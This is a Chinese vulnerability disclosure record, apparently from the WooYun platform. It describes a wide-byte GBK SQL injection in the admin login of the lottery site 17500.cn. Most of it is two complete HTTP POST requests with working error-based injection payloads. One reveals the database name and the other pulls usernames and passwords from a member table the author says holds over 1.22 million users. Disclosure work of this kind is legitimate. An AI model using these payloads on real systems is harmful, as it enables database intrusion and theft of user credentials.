wybug_title: 乐彩网某后台宽字节报错注入泄露上百万用户信息
wybug_detail:
漏洞详情 披露状态：   									2015-04-25：	细节已通知厂商并且等待厂商处理中									2015-04-27：	厂商已经确认，细节仅向厂商公开									2015-05-07：	细节向核心白帽子及相关领域专家公开									2015-05-08：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 最后再来一发~，感觉乐彩是不是开启gpc修复后，由于GBK导致还是有问题？ 详细说明：  
http://bind.17500.cn/admin.php?a=login&c=Login
乐彩网某后台，宽字节注入
POST /admin.php?c=Login&a=signin HTTP/1.1Host: bind.17500.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://bind.17500.cn/admin.php?a=login&c=LoginCookie: PHPSESSID=0v0decj1ln7rpdbi076csgqkg2; pgv_pvi=7211233280; pgv_si=s8662739968; KmGZ_89fa_saltkey=J4L14hLk; KmGZ_89fa_lastvisit=1429892762; KmGZ_89fa_sid=DjDJ33; KmGZ_89fa_lastact=1429928421%09forum.php%09Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 248admin_name=%bf%27||(select 1 from(select count(*),concat((select concat(0x5e5e5e,database(),0x5e5e5e) from information_schema.tables limit 10,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#&admin_pass=123&captcha=7521&act=signin


报错信息说了，库是uc，表是uc_members去提取点数据：
POST /admin.php?c=Login&a=signin HTTP/1.1Host: bind.17500.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://bind.17500.cn/admin.php?a=login&c=LoginCookie: PHPSESSID=0v0decj1ln7rpdbi076csgqkg2; pgv_pvi=7211233280; pgv_si=s8662739968; KmGZ_89fa_saltkey=J4L14hLk; KmGZ_89fa_lastvisit=1429892762; KmGZ_89fa_sid=DjDJ33; KmGZ_89fa_lastact=1429928421%09forum.php%09Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 253admin_name=%bf%27||(select 1 from(select count(*),concat((select concat(0x5e5e5e,username,0x5e,password,0x5e5e5e) from uc.uc_members limit 1220000,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#&admin_pass=123&captcha=7521&act=signin


里面至少有122万用户信息,burp跑一点来看看：



   漏洞证明：     修复方案：     版权声明：转载请注明来源 深度安全实验室@乌云
